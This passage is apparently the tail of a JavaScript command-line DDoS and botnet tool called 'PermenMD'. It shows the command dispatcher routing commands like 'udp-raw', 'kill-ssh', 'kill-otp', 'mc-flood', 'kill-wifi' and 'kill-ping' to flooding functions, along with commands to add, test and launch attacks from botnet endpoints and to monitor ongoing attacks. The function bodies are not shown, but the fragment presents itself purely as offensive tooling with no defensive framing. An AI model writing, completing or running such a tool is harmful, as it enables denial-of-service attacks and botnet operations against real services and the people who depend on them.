  } else if (command === 'kill-ssh') {
    killSSH(args);
  } else if (command === 'kill-otp') {
    killOTP(args);
  } else if (command === 'udp-raw') {
    udp_flood(args);
  } else if (command === 'kill-do') {
    killDo(args);
  } else if (command === 'ongoing') {
    ongoingAttack()
    sigma()
  } else if (command === 'track-ip') {
    trackIP(args);
  } else if (command === 'ai') {
    console.log(`PermenMD Ai Ragbot Started
Type "exit" To Stop Chat`);
    chat_ai()
  } else if (command === 'mc-flood') {
    mcbot(args)
  } else if (command === 'monitor') {
    monitorOngoingAttacks()
  } else if (command === 'kill-ping') {
    pod(args)
  } else if (command === 'samp') {
    samp(args)
  } else if (command === 'subdo-finder') {
    subdomen(args)
  } else if (command === 'kill-wifi') {
    killWifi()
  } else if (command === 'addsrv') {
    processBotnetEndpoint(args)
  } else if (command === 'testsrv') {
    checkBotnetEndpoints()
  } else if (command === 'srvattack') {
    AttackBotnetEndpoints(args) 
  } else if (command === 'cls') {
    banner()
    sigma()
    } else {
    console.log(`${command} Not Found`);
    sigma();
  }
});
}
// [========================================] //
function clearall() {
  clearUserAgent()
}
// [========================================] //
process.on('exit', clearall);
process.on('SIGINT', () => {
  clearall()
  process.exit();
});
process.on('SIGTERM', () => {
clearall()
 process.exit();
});

bootup()
